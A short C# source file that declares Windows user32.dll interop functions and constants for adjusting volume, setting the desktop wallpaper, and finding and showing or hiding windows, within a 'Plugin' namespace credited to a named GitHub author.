using System;
using System.Runtime.InteropServices;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class Imports
    {
        #region "user32"
        private const string user32 = "user32.dll";

        internal const int APPCOMMAND_VOLUME_MUTE =         0x80000;
        internal const int APPCOMMAND_VOLUME_DOWN =         0x90000;
        internal const int APPCOMMAND_VOLUME_UP =           0xA0000;
        internal const int WM_APPCOMMAND =                  0x319;

        internal const uint SPI_SETDESKWALLPAPER =          0x14;
        internal const uint SPIF_UPDATEINIFILE =            0x01;
        internal const uint SPIF_SENDWININICHANGE =         0x02;

        internal const int SW_HIDE =                        0x0;
        internal const int SW_NORMAL =                      0x1;
        internal const int SW_SHOW =                        0x5;   

        [DllImport(user32)]
        internal static extern uint SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);
        [DllImport(user32)]
        internal static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, int lParam);
        [DllImport(user32)]
        internal static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport(user32)]
        internal static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
        [DllImport(user32)]
        internal static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

        #endregion
    }
}
